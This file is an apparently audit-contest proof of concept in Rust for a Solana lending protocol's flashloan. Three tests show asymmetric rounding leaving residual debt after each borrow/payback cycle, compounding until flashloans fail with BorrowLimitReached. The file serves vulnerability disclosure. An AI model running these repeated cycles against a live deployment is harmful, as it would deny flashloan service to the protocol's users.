// PoC for Jupiter Lend (Code4rena 2026-02) — flashloan deactivation lacks a
// zero-debt invariant. Asymmetric raw rounding (borrow rounds up, payback rounds
// down) leaves +1 raw unit of residual debt per exact nominal borrow/payback
// cycle. Residual dust compounds across permissionless cycles on the shared
// flashloan protocol borrow position and eventually forces BorrowLimitReached.
//
// Drop these into the contest test harness (tests crate). If your branch does
// not already have them, the two helpers below are also included.
//
// Run:
//   cargo test -p tests i2_flashloan_exact_payback_can_leave_nonzero_raw_borrow_dust -- --nocapture --test-threads=1
//   cargo test -p tests i2_flashloan_residual_raw_borrow_compounds_across_roundtrips -- --nocapture --test-threads=1
//   cargo test -p tests i2_flashloan_residual_accumulation_eventually_blocks_flashloan_liveness -- --nocapture --test-threads=1
//
// Observed evidence:
//   PoC1: flashloan_active=false active_amount=0 residual_raw_borrow=1
//   PoC2: i2_compound cycles=8 growth_events=8 final_raw_borrow=8
//   PoC3: succeeds for several cycles, then fails with
//         BorrowLimitReached / Custom(6029) / 0x178d in logs.

fn send_ixs_with_signers_result(
    client: &RpcClient,
    payer: &Keypair,
    ixs: Vec<Instruction>,
    extra_signers: Vec<&Keypair>,
) -> std::result::Result<(), String> {
    let recent_blockhash = client
        .get_latest_blockhash()
        .map_err(|e| format!("failed to fetch recent blockhash: {e:?}"))?;

    let mut signers: Vec<&dyn Signer> = vec![payer];
    for signer in extra_signers {
        signers.push(signer as &dyn Signer);
    }

    let tx = Transaction::new_signed_with_payer(
        &ixs,
        Some(&payer.pubkey()),
        &signers,
        recent_blockhash,
    );

    client
        .send_and_confirm_transaction(&tx)
        .map(|_| ())
        .map_err(|e| format!("{e:?}"))
}

fn set_protocol_borrow_config_with_interest_custom(
    client: &RpcClient,
    payer: &Keypair,
    market: LendingMarket,
    protocol: Pubkey,
    base_debt_ceiling: u128,
    max_debt_ceiling: u128,
    expand_percent: u16,
    expand_duration: u32,
) {
    let (_, user_borrow_position) = init_protocol_if_missing(client, payer, market, protocol);

    let mint_account = client
        .get_account(&market.mint)
        .expect("missing mint account while setting borrow config");
    let mint_state =
        spl_token::state::Mint::unpack_from_slice(&mint_account.data)
            .expect("failed to decode mint account");
    let max_allowed = (mint_state.supply as u128).saturating_mul(10);
    let mut capped_max = if max_allowed > 0 {
        std::cmp::min(max_debt_ceiling, max_allowed)
    } else {
        1
    };
    if capped_max == 0 {
        capped_max = 1;
    }
    let mut capped_base = std::cmp::min(base_debt_ceiling, capped_max);
    if capped_base == 0 {
        capped_base = 1;
    }

    let accounts = liquidity::accounts::UpdateUserBorrowConfig {
        authority: payer.pubkey(),
        protocol,
        auth_list: market.auth_list_pda,
        rate_model: market.rate_model_pda,
        mint: market.mint,
        token_reserve: market.reserve_pda,
        user_borrow_position,
    };
    let ix = Instruction {
        program_id: liquidity::ID,
        accounts: anchor_lang::ToAccountMetas::to_account_metas(&accounts, None),
        data: anchor_lang::InstructionData::data(&liquidity::instruction::UpdateUserBorrowConfig {
            user_borrow_config: liquidity::state::UserBorrowConfig {
                mode: 1,
                expand_percent: expand_percent.into(),
                expand_duration: expand_duration.into(),
                base_debt_ceiling: capped_base,
                max_debt_ceiling: capped_max,
            },
        }),
    };
    send_ix(client, payer, ix);
}

// PoC 1: Exact payback leaves residual raw debt.
#[test]
fn i2_flashloan_exact_payback_can_leave_nonzero_raw_borrow_dust() {
    let client = rpc_client();
    let payer = read_payer();
    ensure_funded(&client, &payer);

    let mint = create_test_mint(&client, &payer, 6);
    let market = setup_lending_market(&client, &payer, mint);

    deposit_into_lending(&client, &payer, market, 200_000_000);

    set_rate_data_v1(
        &client,
        &payer,
        market,
        liquidity::state::RateDataV1Params {
            kink: 5_000,
            rate_at_utilization_zero: 25_000,
            rate_at_utilization_kink: 45_000,
            rate_at_utilization_max: 60_000,
        },
    );

    let warmup_protocol = Keypair::new();
    borrow_from_liquidity_as_protocol(&client, &payer, market, &warmup_protocol, 50_000_001);
    std::thread::sleep(Duration::from_secs(3));

    let flashloan_admin_pda = init_flashloan_admin_if_needed(&client, &payer);
    let (_, flashloan_borrow_position_pda) =
        init_protocol_if_missing(&client, &payer, market, flashloan_admin_pda);
    set_protocol_borrow_config_with_interest(
        &client,
        &payer,
        market,
        flashloan_admin_pda,
        1_000_000_000_000,
        10_000_000_000_000,
    );

    let signer_borrow_token_account =
        create_ata_if_needed(&client, &payer, &payer.pubkey(), &market.mint);

    let flashloan_program = flashloan_program_id();
    let flashloan_accounts = vec![
        AccountMeta::new(payer.pubkey(), true),
        AccountMeta::new(flashloan_admin_pda, false),
        AccountMeta::new(signer_borrow_token_account, false),
        AccountMeta::new_readonly(market.mint, false),
        AccountMeta::new(market.reserve_pda, false),
        AccountMeta::new(flashloan_borrow_position_pda, false),
        AccountMeta::new_readonly(market.rate_model_pda, false),
        AccountMeta::new(market.vault_ata, false),
        AccountMeta::new_readonly(market.liquidity_pda, false),
        AccountMeta::new_readonly(liquidity::ID, false),
        AccountMeta::new_readonly(spl_token::ID, false),
        AccountMeta::new_readonly(spl_associated_token_account::ID, false),
        AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
        AccountMeta::new_readonly(anchor_lang::solana_program::sysvar::instructions::id(), false),
    ];

    let flashloan_amount: u64 = 12_345_679;
    let mut borrow_data = anchor_discriminator("flashloan_borrow").to_vec();
    borrow_data.extend_from_slice(&flashloan_amount.to_le_bytes());
    let borrow_ix = Instruction {
        program_id: flashloan_program,
        accounts: flashloan_accounts.clone(),
        data: borrow_data,
    };

    let mut payback_data = anchor_discriminator("flashloan_payback").to_vec();
    payback_data.extend_from_slice(&flashloan_amount.to_le_bytes());
    let payback_ix = Instruction {
        program_id: flashloan_program,
        accounts: flashloan_accounts,
        data: payback_data,
    };

    send_ixs_with_signers(&client, &payer, vec![borrow_ix, payback_ix], vec![]);

    let flashloan_admin = read_flashloan_admin_state(&client, flashloan_admin_pda);
    let residual_raw_borrow =
        read_liquidity_user_borrow_position_raw(&client, flashloan_borrow_position_pda);

    eprintln!(
        "i2 flashloan_active={} active_amount={} residual_raw_borrow={}",
        flashloan_admin.is_flashloan_active,
        flashloan_admin.active_flashloan_amount,
        residual_raw_borrow
    );

    assert!(!flashloan_admin.is_flashloan_active);
    assert_eq!(flashloan_admin.active_flashloan_amount, 0);
    assert!(residual_raw_borrow > 0);
}

// PoC 2: Residual debt compounds across roundtrips.
#[test]
fn i2_flashloan_residual_raw_borrow_compounds_across_roundtrips() {
    let client = rpc_client();
    let payer = read_payer();
    ensure_funded(&client, &payer);

    let mint = create_test_mint(&client, &payer, 6);
    let market = setup_lending_market(&client, &payer, mint);

    deposit_into_lending(&client, &payer, market, 200_000_000);
    set_rate_data_v1(
        &client,
        &payer,
        market,
        liquidity::state::RateDataV1Params {
            kink: 5_000,
            rate_at_utilization_zero: 25_000,
            rate_at_utilization_kink: 45_000,
            rate_at_utilization_max: 60_000,
        },
    );

    let warmup_protocol = Keypair::new();
    borrow_from_liquidity_as_protocol(&client, &payer, market, &warmup_protocol, 50_000_001);
    std::thread::sleep(Duration::from_secs(3));

    let flashloan_admin_pda = init_flashloan_admin_if_needed(&client, &payer);
    let (_, flashloan_borrow_position_pda) =
        init_protocol_if_missing(&client, &payer, market, flashloan_admin_pda);
    set_protocol_borrow_config_with_interest(
        &client,
        &payer,
        market,
        flashloan_admin_pda,
        1_000_000_000_000,
        10_000_000_000_000,
    );

    let signer_borrow_token_account =
        create_ata_if_needed(&client, &payer, &payer.pubkey(), &market.mint);

    let flashloan_program = flashloan_program_id();
    let flashloan_accounts = vec![
        AccountMeta::new(payer.pubkey(), true),
        AccountMeta::new(flashloan_admin_pda, false),
        AccountMeta::new(signer_borrow_token_account, false),
        AccountMeta::new_readonly(market.mint, false),
        AccountMeta::new(market.reserve_pda, false),
        AccountMeta::new(flashloan_borrow_position_pda, false),
        AccountMeta::new_readonly(market.rate_model_pda, false),
        AccountMeta::new(market.vault_ata, false),
        AccountMeta::new_readonly(market.liquidity_pda, false),
        AccountMeta::new_readonly(liquidity::ID, false),
        AccountMeta::new_readonly(spl_token::ID, false),
        AccountMeta::new_readonly(spl_associated_token_account::ID, false),
        AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
        AccountMeta::new_readonly(anchor_lang::solana_program::sysvar::instructions::id(), false),
    ];

    let flashloan_amount: u64 = 12_345_679;
    let cycles: usize = 8;
    let mut previous_raw_borrow =
        read_liquidity_user_borrow_position_raw(&client, flashloan_borrow_position_pda);
    let mut growth_events = 0usize;

    for cycle in 0..cycles {
        let mut borrow_data = anchor_discriminator("flashloan_borrow").to_vec();
        borrow_data.extend_from_slice(&flashloan_amount.to_le_bytes());
        let borrow_ix = Instruction {
            program_id: flashloan_program,
            accounts: flashloan_accounts.clone(),
            data: borrow_data,
        };

        let mut payback_data = anchor_discriminator("flashloan_payback").to_vec();
        payback_data.extend_from_slice(&flashloan_amount.to_le_bytes());
        let payback_ix = Instruction {
            program_id: flashloan_program,
            accounts: flashloan_accounts.clone(),
            data: payback_data,
        };

        send_ixs_with_signers(&client, &payer, vec![borrow_ix, payback_ix], vec![]);

        let current_raw_borrow =
            read_liquidity_user_borrow_position_raw(&client, flashloan_borrow_position_pda);
        if current_raw_borrow > previous_raw_borrow {
            growth_events += 1;
        }

        eprintln!(
            "i2_compound cycle={} previous_raw_borrow={} current_raw_borrow={}",
            cycle, previous_raw_borrow, current_raw_borrow
        );

        assert!(current_raw_borrow >= previous_raw_borrow);
        previous_raw_borrow = current_raw_borrow;
    }

    let flashloan_admin = read_flashloan_admin_state(&client, flashloan_admin_pda);

    assert!(!flashloan_admin.is_flashloan_active);
    assert_eq!(flashloan_admin.active_flashloan_amount, 0);
    assert!(previous_raw_borrow > 1);
    assert!(growth_events > 1);
}

// PoC 3: Deterministic liveness break (BorrowLimitReached).
#[test]
fn i2_flashloan_residual_accumulation_eventually_blocks_flashloan_liveness() {
    let client = rpc_client();
    let payer = read_payer();
    ensure_funded(&client, &payer);

    let mint = create_test_mint(&client, &payer, 6);
    let market = setup_lending_market(&client, &payer, mint);

    deposit_into_lending(&client, &payer, market, 200_000_000);
    set_rate_data_v1(
        &client,
        &payer,
        market,
        liquidity::state::RateDataV1Params {
            kink: 5_000,
            rate_at_utilization_zero: 25_000,
            rate_at_utilization_kink: 45_000,
            rate_at_utilization_max: 60_000,
        },
    );

    let warmup_protocol = Keypair::new();
    borrow_from_liquidity_as_protocol(&client, &payer, market, &warmup_protocol, 50_000_001);
    std::thread::sleep(Duration::from_secs(3));

    let flashloan_admin_pda = init_flashloan_admin_if_needed(&client, &payer);
    let (_, flashloan_borrow_position_pda) =
        init_protocol_if_missing(&client, &payer, market, flashloan_admin_pda);

    let signer_borrow_token_account =
        create_ata_if_needed(&client, &payer, &payer.pubkey(), &market.mint);

    let flashloan_program = flashloan_program_id();
    let flashloan_accounts = vec![
        AccountMeta::new(payer.pubkey(), true),
        AccountMeta::new(flashloan_admin_pda, false),
        AccountMeta::new(signer_borrow_token_account, false),
        AccountMeta::new_readonly(market.mint, false),
        AccountMeta::new(market.reserve_pda, false),
        AccountMeta::new(flashloan_borrow_position_pda, false),
        AccountMeta::new_readonly(market.rate_model_pda, false),
        AccountMeta::new(market.vault_ata, false),
        AccountMeta::new_readonly(market.liquidity_pda, false),
        AccountMeta::new_readonly(liquidity::ID, false),
        AccountMeta::new_readonly(spl_token::ID, false),
        AccountMeta::new_readonly(spl_associated_token_account::ID, false),
        AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
        AccountMeta::new_readonly(anchor_lang::solana_program::sysvar::instructions::id(), false),
    ];

    let flashloan_amount: u64 = 12_345_679;
    let mut borrow_data = anchor_discriminator("flashloan_borrow").to_vec();
    borrow_data.extend_from_slice(&flashloan_amount.to_le_bytes());
    let borrow_ix = Instruction {
        program_id: flashloan_program,
        accounts: flashloan_accounts.clone(),
        data: borrow_data,
    };
    let mut payback_data = anchor_discriminator("flashloan_payback").to_vec();
    payback_data.extend_from_slice(&flashloan_amount.to_le_bytes());
    let payback_ix = Instruction {
        program_id: flashloan_program,
        accounts: flashloan_accounts.clone(),
        data: payback_data,
    };

    let mut low: u128 = 1;
    let mut high: u128 = flashloan_amount as u128;
    while low < high {
        let mid = low + (high - low) / 2;
        set_protocol_borrow_config_with_interest_custom(
            &client, &payer, market, flashloan_admin_pda, mid, mid, 0, 1,
        );
        let sim = simulate_ixs_with_signers(
            &client,
            &payer,
            vec![borrow_ix.clone(), payback_ix.clone()],
            vec![],
        );

        if sim.err.is_none() {
            high = mid;
        } else {
            low = mid.saturating_add(1);
        }
    }

    let min_single_roundtrip_limit = low;
    let operational_limit = min_single_roundtrip_limit;
    set_protocol_borrow_config_with_interest_custom(
        &client,
        &payer,
        market,
        flashloan_admin_pda,
        operational_limit,
        operational_limit,
        0,
        1,
    );

    let mut success_count = 0usize;
    let mut residual_history: Vec<u64> = Vec::new();
    let mut failure_err: Option<String> = None;
    for cycle in 0..64usize {
        match send_ixs_with_signers_result(
            &client,
            &payer,
            vec![borrow_ix.clone(), payback_ix.clone()],
            vec![],
        ) {
            Ok(()) => {
                success_count += 1;
                let raw_borrow =
                    read_liquidity_user_borrow_position_raw(&client, flashloan_borrow_position_pda);
                residual_history.push(raw_borrow);
                eprintln!(
                    "i2_liveness cycle={} success raw_borrow={} calibrated_min_limit={} operational_limit={}",
                    cycle, raw_borrow, min_single_roundtrip_limit, operational_limit
                );
            }
            Err(err) => {
                failure_err = Some(err);
                eprintln!(
                    "i2_liveness cycle={} failed calibrated_min_limit={} operational_limit={}",
                    cycle, min_single_roundtrip_limit, operational_limit
                );
                break;
            }
        }
    }

    let err_dbg = failure_err.unwrap_or_else(|| "no failure observed".to_string());
    eprintln!("i2_liveness final_err={err_dbg}");

    assert!(success_count >= 1);
    assert!(!residual_history.is_empty());

    for window in residual_history.windows(2) {
        assert!(window[1] > window[0]);
    }

    assert!(
        err_dbg.contains("BorrowLimitReached")
            || err_dbg.contains("Custom(6029)")
            || err_dbg.contains("0x178d"),
        "expected borrow-limit liveness failure after accumulation, got: {err_dbg}"
    );
}
